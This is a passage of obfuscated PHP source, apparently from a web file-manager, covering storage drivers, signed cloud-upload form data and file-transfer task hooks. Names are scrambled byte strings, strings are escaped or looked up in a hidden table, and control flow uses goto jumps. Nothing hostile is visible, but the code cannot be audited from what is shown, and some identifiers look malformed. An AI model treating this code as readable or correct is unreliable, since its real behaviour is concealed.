$¸„ç¤«„[$—ºÔ×ÉÚ[564]][$—ºÔ×ÉÚ[641]]; $¸„ç¤«„[$—ºÔ×ÉÚ[564]][$—ºÔ×ÉÚ[642]] = Model($—ºÔ×ÉÚ[626])->getInfoSimpleOuter($Â¦”˜à); } } unset($¸„ç¤«„); } public function parentLevelArray($ùœ¨ÃŠÎ) { $‘ã‚½áÖ =& $_SERVER[øşô´çË]; $ùœ¨ÃŠÎ = explode($‘ã‚½áÖ[60], trim($ùœ¨ÃŠÎ, $‘ã‚½áÖ[60])); return array_to_int(array_filter($ùœ¨ÃŠÎ)); } public function listAll($™·†ŠÅ) { $İÅÂ“š± =& $_SERVER[øşô´çË]; $øÜÈ„ÁÅ = $this->sourceInfo($™·†ŠÅ); $¤ìíÛ = array($İÅÂ“š±[643] => array($İÅÂ“š±[644], $øÜÈ„ÁÅ[$İÅÂ“š±[613]] . $™·†ŠÅ . $İÅÂ“š±[645]), $İÅÂ“š±[646] => 0); $İ¨õÊ = $İÅÂ“š±[647]; $âª„æõö = "\x4c\x45\106\124\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\146\x69\x6c\145\x20\x66\151\154\145\x20\157\156\x20\x73\157\165\162\143\145\56\x66\151\x6c\145\x49\x44\x20\x3d\x20\x66\x69\x6c\145\x2e\146\151\x6c\145\111\104"; $–ÆÈ«„ = $this->alias($İÅÂ“š±[542])->field($İ¨õÊ)->where($¤ìíÛ)->join($âª„æõö)->select(); $this->_listAppendAuth($–ÆÈ«„); $this->_listAppendUser($–ÆÈ«„); $this->_listAppendPath($–ÆÈ«„); $–ÆÈ«„ = array_to_keyvalue($–ÆÈ«„, $İÅÂ“š±[201]); $ÏÑ’±ß = "\57{$øÜÈ„ÁÅ[$İÅÂ“š±[42]]}\x2f"; $ÏÑ’±ß = $ÏÑ’±ß == $İÅÂ“š±[264] ? $İÅÂ“š±[8] : $ÏÑ’±ß; $ó¤íûéš = array(); foreach ($–ÆÈ«„ as $üÒù·ÌÛ => $¦¶óˆ) { $µŠ¨ğ€ = $this->parentLevelArray($¦¶óˆ[$İÅÂ“š±[613]]); array_shift($µŠ¨ğ€); $ì¨ˆ±˜ = $ÏÑ’±ß; for ($Ë ÈÏË = 0; $Ë ÈÏË < count($µŠ¨ğ€); $Ë ÈÏË++) { $ì¨ˆ±˜ .= $–ÆÈ«„[$µŠ¨ğ€[$Ë ÈÏË]][$İÅÂ“š±[42]] . $İÅÂ“š±[8]; } $ì¨ˆ±˜ .= $¦¶óˆ[$İÅÂ“š±[42]]; if ($¦¶óˆ[$İÅÂ“š±[509]]) { $ì¨ˆ±˜ .= $İÅÂ“š±[8]; } $‰ŸĞÏéË = array($İÅÂ“š±[519] => str_replace($İÅÂ“š±[264], $İÅÂ“š±[8], str_replace($İÅÂ“š±[264], $İÅÂ“š±[8], str_replace($İÅÂ“š±[264], $İÅÂ“š±[8], $ì¨ˆ±˜))), $İÅÂ“š±[648] => intval($¦¶óˆ[$İÅÂ“š±[509]]), $İÅÂ“š±[649] => intval($¦¶óˆ[$İÅÂ“š±[89]]), $İÅÂ“š±[98] => intval($¦¶óˆ[$İÅÂ“š±[98]]), $İÅÂ“š±[100] => $this->pathInfoFilter($¦¶óˆ)); if (!$‰ŸĞÏéË[$İÅÂ“š±[509]]) { $‰ŸĞÏéË[$İÅÂ“š±[566]] = $¦¶óˆ[$İÅÂ“š±[566]]; } $ó¤íûéš[] = $‰ŸĞÏéË; } $ó¤íûéš = array_sort_by($ó¤íûéš, $İÅÂ“š±[97]); return $ó¤íûéš; } } goto DÅÉ›Ó¸Ó; bæ’ Â¼¶ò: class PathDriverBOS extends PathDriverS3 { public function __construct($úÜ…±) { parent::__construct($úÜ…±); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($­­×¸®Ò) { parent::__construct($­­×¸®Ò); $this->setSignVersion($_SERVER[øşô´çË][257]); } public function uploadFormData($ÜòØÒş™, $îºÑƒÏœ = 3600) { $„ÆÆÓµğ =& $_SERVER[øşô´çË]; $Åó‹…ØÎ = $„ÆÆÓµğ[239]; $‡×½¨à‘ = $„ÆÆÓµğ[1520]; $’“–Ğšû = $„ÆÆÓµğ[271]; $—Ò²úÍ» = gmdate($„ÆÆÓµğ[1521], time() + $îºÑƒÏœ); $¥™Ä°û˜ = (string) time() . $„ÆÆÓµğ[84] . (string) (time() + $îºÑƒÏœ); $—ş‚²Ë = array($„ÆÆÓµğ[272] => $—Ò²úÍ», $„ÆÆÓµğ[275] => array(array($„ÆÆÓµğ[315] => $Åó‹…ØÎ), array($„ÆÆÓµğ[276] => $this->bucket), array($„ÆÆÓµğ[277], $„ÆÆÓµğ[278], $„ÆÆÓµğ[12]), array($„ÆÆÓµğ[280] => $’“–Ğšû), array($„ÆÆÓµğ[1522] => $‡×½¨à‘), array($„ÆÆÓµğ[1523] => $this->accessKey), array($„ÆÆÓµğ[1524] => $¥™Ä°û˜))); $—ş‚²Ë = json_encode($—ş‚²Ë); $“İ’³Ÿ˜ = hash_hmac($„ÆÆÓµğ[1520], $¥™Ä°û˜, $this->secret); $èØë²Ù£ = sha1($—ş‚²Ë); $‹«ÖÇÆµ = hash_hmac($„ÆÆÓµğ[1520], $èØë²Ù£, $“İ’³Ÿ˜); $„ã†š§§ = array($„ÆÆÓµğ[315] => $Åó‹…ØÎ, $„ÆÆÓµğ[280] => $’“–Ğšû, $„ÆÆÓµğ[287] => base64_encode($—ş‚²Ë), $„ÆÆÓµğ[1522] => $‡×½¨à‘, $„ÆÆÓµğ[1523] => $this->accessKey, $„ÆÆÓµğ[1525] => $¥™Ä°û˜, $„ÆÆÓµğ[1526] => $‹«ÖÇÆµ, $„ÆÆÓµğ[216] => $this->getHost()); return $„ã†š§§; } public function fileOutImage($öÜÚÖŸŸ, $úƒˆú‘´ = 250) { $ìÖÜ»¤œ =& $_SERVER[øşô´çË]; if ($this->size($öÜÚÖŸŸ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($öÜÚÖŸŸ, $úƒˆú‘´); } $ÆÈöÁ = $this->link($öÜÚÖŸŸ); $ÆÈöÁ .= $ìÖÜ»¤œ[1527] . $úƒˆú‘´ . $ìÖÜ»¤œ[1528]; $this->fileOutLink($ÆÈöÁ); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ü³¢Óª) { $this->pathParse = $ü³¢Óª; $this->model = Model($_SERVER[øşô´çË][1529]); } public function getPath($ Ó©¾ï) { return trim($ Ó©¾ï, $_SERVER[øşô´çË][8]); } public function pathFather($œÃ±’­ƒ) { $Í’ñºŸ¿ = $this->parse($œÃ±’­ƒ); $Í’ñºŸ¿ = $this->infoSimple($œÃ±’­ƒ); return $Í’ñºŸ¿ ? $Í’ñºŸ¿[$_SERVER[øşô´çË][200]] : !1; } public function pathThis($’ÍÙŠ«Õ) { $Ğ¤ÀâÏ = $this->infoSimple($’ÍÙŠ«Õ); return $Ğ¤ÀâÏ ? $Ğ¤ÀâÏ[$_SERVER[øşô´çË][42]] : !1; } public function getPathOuter($©‹¹È¾¯) { if (!$©‹¹È¾¯) { return $©‹¹È¾¯; } $Ş›ŸÓóº = $this->parse($©‹¹È¾¯); return KodIO::make($Ş›ŸÓóº[$_SERVER[øşô´çË][496]]); } public function copyFolderFromIO($™²½ºÙÁ, $ÛÀ´ê¨Á, $Á”«˜Ñø, $Š¥şÓÒú, $€²ÏûÂå) { $ìü¶×¦Ù = $this->model->copyFolderFromIO($™²½ºÙÁ, $ÛÀ´ê¨Á, $Á”«˜Ñø, $Š¥şÓÒú, $€²ÏûÂå); return KodIO::make($ìü¶×¦Ù); } public function isParentOf($Ø¢å¥, $á”è§Æè) { return $this->model->isParentOf($Ø¢å¥, $á”è§Æè); } public function mkfile($ ·¢±Ğ‹, $±‘í²ƒ¨ = '', $•²”×õ‚ = REPEAT_RENAME) { $ê¢¡›¥ö =& $_SERVER[øşô´çË]; $¦ÇÇ» = $this->parse($ ·¢±Ğ‹); $ ·¢±Ğ‹ = $¦ÇÇ»[$ê¢¡›¥ö[496]]; for ($¶¸­ı«€ = 0; $¶¸­ı«€ < count($¦ÇÇ»[$ê¢¡›¥ö[1530]]); $¶¸­ı«€++) { $ö¤ˆ‹©  = $¦ÇÇ»[$ê¢¡›¥ö[1530]][$¶¸­ı«€]; if ($¶¸­ı«€ == count($¦ÇÇ»[$ê¢¡›¥ö[1530]]) - 1) { $ ·¢±Ğ‹ = $this->model->mkfile($ ·¢±Ğ‹, $ö¤ˆ‹© , $±‘í²ƒ¨, $•²”×õ‚); break; } $ ·¢±Ğ‹ = $this->model->mkdir($ ·¢±Ğ‹, $ö¤ˆ‹© , REPEAT_SKIP); } return $this->getPathOuter($ ·¢±Ğ‹); } public function mkdir($ª˜Ò¢, $ú•ı¦öó = REPEAT_SKIP) { $²ïîŸ±Š =& $_SERVER[øşô´çË]; $ø½ªòªĞ = $this->parse($ª˜Ò¢); $ª˜Ò¢ = $ø½ªòªĞ[$²ïîŸ±Š[496]]; for ($âÙ­³Óñ = 0; $âÙ­³Óñ < count($ø½ªòªĞ[$²ïîŸ±Š[1530]]); $âÙ­³Óñ++) { $ê½É÷’ = $ø½ªòªĞ[$²ïîŸ±Š[1530]][$âÙ­³Óñ]; $ª˜Ò¢ = $this->model->mkdir($ª˜Ò¢, $ê½É÷’, $ú•ı¦öó); } return $this->getPathOuter($ª˜Ò¢); } public function copyFile($û„´¼Ö, $Ûê‰íË™, $ šôÑó = REPEAT_REPLACE) { $¢áŠ¢Ñ– =& $_SERVER[øşô´çË]; $˜ºÚ÷ËÑ = $this->parse($Ûê‰íË™); $¹ÜÛˆÏ£ = $this->model->copy($û„´¼Ö, $˜ºÚ÷ËÑ[$¢áŠ¢Ñ–[496]], $ šôÑó, $˜ºÚ÷ËÑ[$¢áŠ¢Ñ–[97]]); return $¹ÜÛˆÏ£ ? $this->getPathOuter($¹ÜÛˆÏ£) : !1; } public function moveFile($Òğ‡Òæì, $Öµç¡öÕ, $Ø£”“µå = REPEAT_REPLACE) { $ÕºÒïÊà =& $_SERVER[øşô´çË]; $õØ˜¦ºÛ = $this->parse($Öµç¡öÕ); $Ó‰áœûƒ = $this->model->move($Òğ‡Òæì, $õØ˜¦ºÛ[$ÕºÒïÊà[496]], $Ø£”“µå, $õØ˜¦ºÛ[$ÕºÒïÊà[97]]); return $Ó‰áœûƒ ? $this->getPathOuter($Ó‰áœûƒ) : !1; } public function copy($ß–È— , $Î•ğ×€, $š°ÉôÊ = REPEAT_REPLACE, $¹§“œ¡´ = false) { $ÚÚû˜Ò = $this->parse($Î•ğ×€); $§ƒÁª–û = $this->model->copy($ß–È— , $ÚÚû˜Ò[$_SERVER[øşô´çË][496]], $š°ÉôÊ, $¹§“œ¡´); return $§ƒÁª–û ? $this->getPathOuter($§ƒÁª–û) : !1; } public function moveSameAllow() { } public function move($öšÃˆƒ¹, $î™Ÿåİ¢, $İôéá¢© = REPEAT_REPLACE, $·‰ãºÀ = false) { $Ä—ËÜéõ = $this->parse($î™Ÿåİ¢); $ìôĞÇœŸ = $this->model->move($öšÃˆƒ¹, $Ä—ËÜéõ[$_SERVER[øşô´çË][496]], $İôéá¢©, $·‰ãºÀ); return $ìôĞÇœŸ ? $this->getPathOuter($ìôĞÇœŸ) : !1; } public function remove($É†Ùù“õ, $¯º³¤œ“ = true) { return $this->model->remove($É†Ùù“õ, $¯º³¤œ“); } public function rename($ç˜•Ìó¹, $¦ßı²‘¸) { $¢ÖÛÄĞı = $this->model->rename($ç˜•Ìó¹, $¦ßı²‘¸); return $¢ÖÛÄĞı ? $this->getPathOuter($ç˜•Ìó¹) : $¢ÖÛÄĞı; } public function size($‰¤Ì¬ª×) { $ê®¤“Å£ = $this->infoSimple($‰¤Ì¬ª×); return $ê®¤“Å£ ? $ê®¤“Å£[$_SERVER[øşô´çË][89]] : 0; } public function infoSimple($âÖÛó•‚) { return $this->model->sourceInfo($âÖÛó•‚); } public function info($Á›–Ñ•š) { return $this->infoParse($Á›–Ñ•š); } public function infoAuth($•­ÅÌ¹ ) { return $this->infoParse($•­ÅÌ¹ , !1, !0); } public function infoWithChildren($»ªó‰Íä) { return $this->infoParse($»ªó‰Íä, !0); } protected function infoParse($¾–ïÉ, $üˆ…ü‰ı = false, $Œ×ôØÉŒ = false) { if (!$üˆ…ü‰ı) { return $this->model->pathInfo($¾–ïÉ, $Œ×ôØÉŒ); } return $this->model->pathInfoMore($¾–ïÉ); } public function infoFullSimple($÷‡Áì¦) { $†ÅÆß³˜ =& $_SERVER[øşô´çË]; $­«´šâÜ = explode($†ÅÆß³˜[8], $÷‡Áì¦); $é½ôÚÒ = implode($†ÅÆß³˜[8], array_splice($­«´šâÜ, 1)); return $this->model->pathInfoByPath($­«´šâÜ[0], $é½ôÚÒ); } public function infoFull($üÛöŠ¥) { $±éÎÔ‘ì = $this->infoFullSimple($üÛöŠ¥); return is_array($±éÎÔ‘ì) ? $this->model->pathInfo($±éÎÔ‘ì[$_SERVER[øşô´çË][201]]) : !1; } public function hashSimple($ÄÍ¦½†€) { $§ñ…¥Á =& $_SERVER[øşô´çË]; $âÇ“ğğ” = $this->infoWithChildren($ÄÍ¦½†€); return $âÇ“ğğ”[$§ñ…¥Á[177]][$§ñ…¥Á[703]]; } public function hashMd5($Å»Ô¿¹) { $ê€êË¸ =& $_SERVER[øşô´çË]; $Èµ´ı° = $this->infoWithChildren($Å»Ô¿¹); return $Èµ´ı°[$ê€êË¸[177]][$ê€êË¸[572]]; } public function exist($³òµô•) { $×¶Î°¤Î =& $_SERVER[øşô´çË]; $¸î§§¿¿ = $this->parse($³òµô•); if (!$¸î§§¿¿[$×¶Î°¤Î[97]]) { return $this->isFile($³òµô•) || $this->isFolder($³òµô•); } $®…ÇÒúé = array($×¶Î°¤Î[501] => $¸î§§¿¿[$×¶Î°¤Î[496]], $×¶Î°¤Î[42] => $¸î§§¿¿[$×¶Î°¤Î[97]]); $‡‡óÓ‘½ = $this->model->where($®…ÇÒúé)->find(); return $‡‡óÓ‘½ ? !0 : !1; } public function isFile($ä´ÏÇ¬ù) { $ÎÍåÈèš =& $_SERVER[øşô´çË]; $îİ½·µ“ = $this->infoSimple($ä´ÏÇ¬ù); return $îİ½·µ“ && $îİ½·µ“[$ÎÍåÈèš[509]] == $ÎÍåÈèš[238] ? !0 : !1; } public function isFolder($Ï”¦…ıŒ) { $‘‹ÑÛ× =& $_SERVER[øşô´çË]; $ŒÀï’šû = $this->infoSimple($Ï”¦…ıŒ); return $ŒÀï’šû && $ŒÀï’šû[$‘‹ÑÛ×[509]] == $‘‹ÑÛ×[101] ? !0 : !1; } public function listPath($’àïŠÕ, $­«àÚ = false) { $ù¦•½®– =& $_SERVER[øşô´çË]; if ($’àïŠÕ == $ù¦•½®–[12]) { return !1; } $€¥Í»¬ä = array($ù¦•½®–[501] => $’àïŠÕ); if ($­«àÚ) { return $this->model->listSource($€¥Í»¬ä, -1); } return $this->model->listSource($€¥Í»¬ä); } public function has($©Øá¯ó‰, $Û·ŠÓËĞ = false, $…Á³¹æ¸ = null) { $àã‘ä›Á =& $_SERVER[øşô´çË]; $§ÅÎ¹¥ = $this->infoWithChildren($©Øá¯ó‰); if ($Û·ŠÓËĞ) { return array($àã‘ä›Á[250] => $§ÅÎ¹¥[$àã‘ä›Á[250]], $àã‘ä›Á[249] => $§ÅÎ¹¥[$àã‘ä›Á[249]]); } return $…Á³¹æ¸ ? $§ÅÎ¹¥[$àã‘ä›Á[250]] : $§ÅÎ¹¥[$àã‘ä›Á[249]]; } public function listAll($ëÕ®åºñ) { $ş›ëàØ¢ = IO::info($this->pathParse[$_SERVER[øşô´çË][97]]); if (!$ş›ëàØ¢) { return array(); } return $this->model->listAll($ëÕ®åºñ); } public function getContent($œß¤¶Òí) { return $this->model->getContent($œß¤¶Òí); } public function setContent($Ìùû°¾, $Ø¼Ö”Ïà = '') { return $this->model->setContent($Ìùû°¾, $Ø¼Ö”Ïà); } public function fileSubstr($‘è„€ö, $¾±»ì³ô, $§™´›´) { return $this->model->fileSubstr($‘è„€ö, $¾±»ì³ô, $§™´›´); } public function download($ËéÉõÆ¥, $›Ò°½°¢ = '') { $‚à’ÌÔ¶ = get_path_father($›Ò°½°¢); $Æ¬ş¯ŠÎ = get_path_this($›Ò°½°¢); $¬şŒ­İ = $this->model->fileInfoGet($ËéÉõÆ¥); $âÀ÷¢³ = IO::copy($¬şŒ­İ[$_SERVER[øşô´çË][97]], $‚à’ÌÔ¶, !1, $Æ¬ş¯ŠÎ); return $âÀ÷¢³; } public function setModifyTime($³êëè„Ô, $ÒÂÇ¥ôÍ = '') { $Ó”ÇòëÏ =& $_SERVER[øşô´çË]; if (!$³êëè„Ô) { return; } $this->model->where(array($Ó”ÇòëÏ[515] => $³êëè„Ô))->save(array($Ó”ÇòëÏ[98] => $ÒÂÇ¥ôÍ)); } public function upload($××Ïø‹, $ Ñ”§İ, $õç¸û£Û = false, $Ï¾”“şŠ = REPEAT_REPLACE) { $Â¡¸Ÿ¥Ô =& $_SERVER[øşô´çË]; $µ±¹ÕîÓ = $this->parse($××Ïø‹); $Òğ¼§Ï¨ = $this->model->addFile($µ±¹ÕîÓ[$Â¡¸Ÿ¥Ô[496]], $ Ñ”§İ, $µ±¹ÕîÓ[$Â¡¸Ÿ¥Ô[97]], $õç¸û£Û, $Ï¾”“şŠ); return $this->getPathOuter($Òğ¼§Ï¨); } public function uploadFileByID($¨ñïîÄ, $œì€¸·Š, $Çßü‹ºÀ) { $¨ÎšµÄˆ =& $_SERVER[øşô´çË]; $¯Çğ¿¬ = $this->parse($¨ñïîÄ); $éÉíî = $this->model->addFileByFileID($¯Çğ¿¬[$¨ÎšµÄˆ[496]], $œì€¸·Š, $¯Çğ¿¬[$¨ÎšµÄˆ[97]], $Çßü‹ºÀ); return $this->getPathOuter($éÉíî); } public function addFileByRemote($…¦¥‰¦, $¯ĞäéûÊ, $»°Å™´ = array(), $Ì‚¢áÖñ = '', $¯…Ò†) { $ö òæÜŠ =& $_SERVER[øşô´çË]; $Å’ı¼Øû = $this->parse($…¦¥‰¦); $Ì‚¢áÖñ = empty($Ì‚¢áÖñ) ? $Å’ı¼Øû[$ö òæÜŠ[97]] : $Ì‚¢áÖñ; $±“¹Â– = $this->model->addFileByRemote($Å’ı¼Øû[$ö òæÜŠ[496]], $¯ĞäéûÊ, $Ì‚¢áÖñ, $»°Å™´, $¯…Ò†); return $this->getPathOuter($±“¹Â–); } public function uploadLink($¸Ñó¥×ö, $¿ˆ¹‰’é = 0) { $´Ò’øÀœ =& $_SERVER[øşô´çË]; $í×—şÄµ = $this->parse($¸Ñó¥×ö); $êÑ˜´ã = _get($GLOBALS[$´Ò’øÀœ[7]], $´Ò’øÀœ[1531]); $¥ÛïïÓè = _get($GLOBALS[$´Ò’øÀœ[7]], $´Ò’øÀœ[1532]); $ÕÔ•Ê¹ = KodIO::ioFileDriverGet($´Ò’øÀœ[507] . $í×—şÄµ[$´Ò’øÀœ[496]] . $´Ò’øÀœ[411]); $²ÈŸœß„ = Model($´Ò’øÀœ[705])->createFileName($í×—şÄµ[$´Ò’øÀœ[97]], $ÕÔ•Ê¹, $êÑ˜´ã, $¥ÛïïÓè); return IO::uploadLink($²ÈŸœß„, $¿ˆ¹‰’é); } public function fileNameAuto($ª¤÷šÅ¶, $âÙÔå«•, $İ†¾”âˆ = REPEAT_REPLACE, $Ôù±¹—é = false) { return $this->model->fileNameAuto($ª¤÷šÅ¶, $âÙÔå«•, $İ†¾”âˆ, $Ôù±¹—é); } public function fileNameExist($½Äş·«, $¦Ë¼Ùº) { return $this->model->fileNameExist($½Äş·«, $¦Ë¼Ùº); } protected function _fileOut($ À‰•Ì, $£ô¢ø÷¾ = false, $Éòˆ©şº = false, $àÏ…¢ˆø = '', $©®ĞûÏÊ = false) { $¢‚š÷‡… =& $_SERVER[øşô´çË]; $Å†íŠÁ = $this->model->sourceInfo($ À‰•Ì); if ($Å†íŠÁ[$¢‚š÷‡…[509]] == $¢‚š÷‡…[101]) { header($¢‚š÷‡…[1533]); die; } $şâàÇ¶Ö = $this->model->fileInfoGet($ À‰•Ì); $àÏ…¢ˆø = $şâàÇ¶Ö[$¢‚š÷‡…[572]] ? $şâàÇ¶Ö[$¢‚š÷‡…[572]] : $àÏ…¢ˆø; $§ğæŠåò = isset($GLOBALS[$¢‚š÷‡…[190]]) && is_array($GLOBALS[$¢‚š÷‡…[190]]) ? $GLOBALS[$¢‚š÷‡…[190]][$¢‚š÷‡…[42]] : $Å†íŠÁ[$¢‚š÷‡…[42]]; if ($©®ĞûÏÊ) { return IO::fileOutServer($şâàÇ¶Ö[$¢‚š÷‡…[97]], $£ô¢ø÷¾, $§ğæŠåò, $àÏ…¢ˆø); } IO::fileOut($şâàÇ¶Ö[$¢‚š÷‡…[97]], $£ô¢ø÷¾, $§ğæŠåò, $àÏ…¢ˆø); } public function fileOut($–Ê‹ˆÍõ, $…¨ìö“ø = false, $ÕôÆ²“ = false, $†§ÕÜÙÔ = '') { $this->_fileOut($–Ê‹ˆÍõ, $…¨ìö“ø, $ÕôÆ²“, $†§ÕÜÙÔ); } public function fileOutServer($•“·Ğ…, $¦ó— ÖÓ = false, $Ç¬Şôßô = false, $Ÿ½õóË³ = '') { $this->_fileOut($•“·Ğ…, $¦ó— ÖÓ, $Ç¬Şôßô, $Ÿ½õóË³, !0); } protected function _fileOutImage($‡é•Œö, $Ôâ—šÒ· = 250) { $…ô¬´ÀØ =& $_SERVER[øşô´çË]; $ÔÑÉÜ·± = $this->model->pathInfo($‡é•Œö); if ($ÔÑÉÜ·±[$…ô¬´ÀØ[509]] == $…ô¬´ÀØ[101]) { show_json($…ô¬´ÀØ[1534] . $‡é•Œö, !1); } $¤øæŒ×† = $this->model->fileInfoGet($‡é•Œö); $ÔÑÉÜ·±[$…ô¬´ÀØ[191]] = $¤øæŒ×†[$…ô¬´ÀØ[97]]; $GLOBALS[$…ô¬´ÀØ[190]] = $ÔÑÉÜ·±; IO::fileOutImage($¤øæŒ×†[$…ô¬´ÀØ[97]], $Ôâ—šÒ·); } public function fileOutImage($ÁùÓ†Üí, $òä„¢½ = 250) { $this->_fileOutImage($ÁùÓ†Üí, $òä„¢½); } public function fileOutImageServer($„’‚æÚ, $ºñŸâÃ = 250) { $this->_fileOutImage($„’‚æÚ, $ºñŸâÃ); } public function link($âôï¾õı, $Ê³¥ ï = '') { $ññç¼¡Á = $this->model->fileInfoGet($âôï¾õı); return IO::link($ññç¼¡Á[$_SERVER[øşô´çË][97]], $Ê³¥ ï); } protected function parse($‰®ö¬¼ˆ) { $øıñôÛú =& $_SERVER[øşô´çË]; if (strstr($‰®ö¬¼ˆ, $øıñôÛú[8]) === !1) { return array($øıñôÛú[517] => intval($‰®ö¬¼ˆ), $øıñôÛú[97] => $øıñôÛú[12], $øıñôÛú[1530] => array()); } $äùàãÜì = explode($øıñôÛú[8], trim($‰®ö¬¼ˆ, $øıñôÛú[8])); if (count($äùàãÜì) < 2) { show_tips(clear_html($‰®ö¬¼ˆ) . $øıñôÛú[1535]); } return array($øıñôÛú[517] => intval($äùàãÜì[0]), $øıñôÛú[97] => $äùàãÜì[1], $øıñôÛú[1530] => array_slice($äùàãÜì, 1)); } } goto a£‘²ª¨»Õ; CÂ¹ì™–”Ã: function binCheckBigger($˜ğâÈ´‡, $Ğ¤«á­˜) { return $˜ğâÈ´‡ > $Ğ¤«á­˜; } $_SERVER[$_SERVER[¸—ÈÚ´„][3]] = ("\71\62\65\60".strrev('23'))+0;$_ijpw="irmtqojluxnfdepah9csz1823507kbyg6wv4xp2mqfe01lcg6ry85n9ukdtijbz7avsw3oh4zfk98g";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Õ©§¨—İ, $Ô†ªÁßè) { $¬ˆùö¶ğ =& $_SERVER[øşô´çË]; if (isset(self::$_methodList[$Õ©§¨—İ])) { return @call_user_func_array(self::$_methodList[$Õ©§¨—İ], $Ô†ªÁßè); } else { if (method_exists($this, $Õ©§¨—İ)) { return call_user_func_array(array($this, $Õ©§¨—İ), $Ô†ªÁßè); } else { think_exception(__CLASS__ . $¬ˆùö¶ğ[4] . $Õ©§¨—İ . $¬ˆùö¶ğ[5]); } } } public static function __callStatic($¤¨®¹öè, $‚ØáïÆ) { if (isset(self::$_methodListStatic[$¤¨®¹öè])) { return call_user_func_array(self::$_methodListStatic[$¤¨®¹öè], $‚ØáïÆ); } else { if (method_exists(self, $¤¨®¹öè)) { return call_user_func_array(array(self, $¤¨®¹öè), $‚ØáïÆ); } else { show_json("{$¤¨®¹öè}\x28\x29\x20\x6e\x6f\164\40\x65\x78\151\x73\164\73", !1); } } } public static function addMethod($í¾²íæü, $¦Üè÷Ç) { self::$_methodList[$í¾²íæü] = $¦Üè÷Ç; } public static function addMethodStatic($¢µÆµªµ, $úÛÌ†…„) { self::$_methodListStatic[$¢µÆµªµ] = $úÛÌ†…„; } } goto a‘á½Ö·îÆ; Bø¨°÷Ñµ: class TaskFileTransfer extends Task { protected function startAfter() { $Ç˜ø±¿¤ =& $_SERVER[øşô´çË]; $“¢á¦Ôç =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ç˜ø±¿¤[2003], array($this, $Ç˜ø±¿¤[2004])); Hook::bind($Ç˜ø±¿¤[1409], array($this, $Ç˜ø±¿¤[2005])); Hook::bind($Ç˜ø±¿¤[2006], array($this, $Ç˜ø±¿¤[2007])); Hook::bind($Ç˜ø±¿¤[699], array($this, $Ç˜ø±¿¤[2008])); Hook::bind($Ç˜ø±¿¤[700], array($this, $Ç˜ø±¿¤[2009])); Hook::bind($Ç˜ø±¿¤[706], array($this, $Ç˜ø±¿¤[2010])); Hook::bind($Ç˜ø±¿¤[707], array($this, $Ç˜ø±¿¤[2011])); Hook::bind($Ç˜ø±¿¤[702], array($this, $Ç˜ø±¿¤[2012])); Hook::bind($Ç˜ø±¿¤[704], array($this, $Ç˜ø±¿¤[2013])); Hook::bind($Ç˜ø±¿¤[668], array($this, $Ç˜ø±¿¤[2014])); Hook::bind($Ç˜ø±¿¤[665], array($this, $Ç˜ø±¿¤[2014])); Hook::bind($Ç˜ø±¿¤[670], array($this, $Ç˜ø±¿¤[2014])); Hook::bind($Ç˜ø±¿¤[672], array($this, $Ç˜ø±¿¤[2014])); Hook::bind($Ç˜ø±¿¤[674], array($this, $Ç˜ø±¿¤[2014])); Hook::bind($Ç˜ø±¿¤[2015], array($this, $Ç˜ø±¿¤[2016])); Hook::bind($Ç˜ø±¿¤[690], array($this, $Ç˜ø±¿¤[2017])); $this->sourceModelCopyFlag = !1; Hook::bind($Ç˜ø±¿¤[2018], array($this, $Ç˜ø±¿¤[2019])); Hook::bind($Ç˜ø±¿¤[2020], array($this, $Ç˜ø±¿¤[2021])); Hook::bind($Ç˜ø±¿¤[2022], array($this, $Ç˜ø±¿¤[2023])); $“¢á¦Ôç[$Ç˜ø±¿¤[2024]] = LNG($Ç˜ø±¿¤[2025]); $“¢á¦Ôç[$Ç˜ø±¿¤[2026]] = 0; $“¢á¦Ôç[$Ç˜ø±¿¤[2027]] = 0; $“¢á¦Ôç[$Ç˜ø±¿¤[1230]] = $Ç˜ø±¿¤[12]; $“¢á¦Ôç[$Ç˜ø±¿¤[2028]] = $Ç˜ø±¿¤[12]; $“¢á¦Ôç[$Ç˜ø±¿¤[2029]] = 0; $“¢á¦Ôç[$Ç˜ø±¿¤[2030]] = 0; $“¢á¦Ôç[$Ç˜ø±¿¤[943]] = 0; if (!$“¢á¦Ôç[$Ç˜ø±¿¤[1862]]) { $“¢á¦Ôç[$Ç˜ø±¿¤[1862]] = LNG($Ç˜ø±¿¤[2031]); } } protected function endAfter() { $æ›Ú”Ü¨ =& $_SERVER[øşô´çË]; Hook::unbind($æ›Ú”Ü¨[2003], array($this, $æ›Ú”Ü¨[2004])); Hook::unbind($æ›Ú”Ü¨[1409], array($this, $æ›Ú”Ü¨[2005])); Hook::unbind($æ›Ú”Ü¨[2006], array($this, $æ›Ú”Ü¨[2007])); Hook::unbind($æ›Ú”Ü¨[699], array($this, $æ›Ú”Ü¨[2008])); Hook::unbind($æ›Ú”Ü¨[700], array($this, $æ›Ú”Ü¨[2009])); Hook::unbind($æ›Ú”Ü¨[706], array($this, $æ›Ú”Ü¨[2010])); Hook::unbind($æ›Ú”Ü¨[707], array($this, $æ›Ú”Ü¨[2011])); Hook::unbind($æ›Ú”Ü¨[702], array($this, $æ›Ú”Ü¨[2012])); Hook::unbind($æ›Ú”Ü¨[704], array($this, $æ›Ú”Ü¨[2013])); Hook::unbind($æ›Ú”Ü¨[668], array($this, $æ›Ú”Ü¨[2014])); Hook::unbind($æ›Ú”Ü¨[665], array($this, $æ›Ú”Ü¨[2014])); Hook::unbind($æ›Ú”Ü¨[670], array($this, $æ›Ú”Ü¨[2014])); Hook::unbind($æ›Ú”Ü¨[672], array($this, $æ›Ú”Ü¨[2014])); Hook::unbind($æ›Ú”Ü¨[674], array($this, $æ›Ú”Ü¨[2014])); Hook::unbind($æ›Ú”Ü¨[2015], array($this, $æ›Ú”Ü¨[2016])); Hook::unbind($æ›Ú”Ü¨[690], array($this, $æ›Ú”Ü¨[2017])); Hook::unbind($æ›Ú”Ü¨[2018], array($this, $æ›Ú”Ü¨[2019])); Hook::unbind($æ›Ú”Ü¨[2020], array($this, $æ›Ú”Ü¨[2021])); Hook::unbind($æ›Ú”Ü¨[2022], array($this, $æ›Ú”Ü¨[2023])); } public function copyMoveStart($€û°¦á», $‚ûŠÓ†Ã, $ÂÇòñÛ¼, 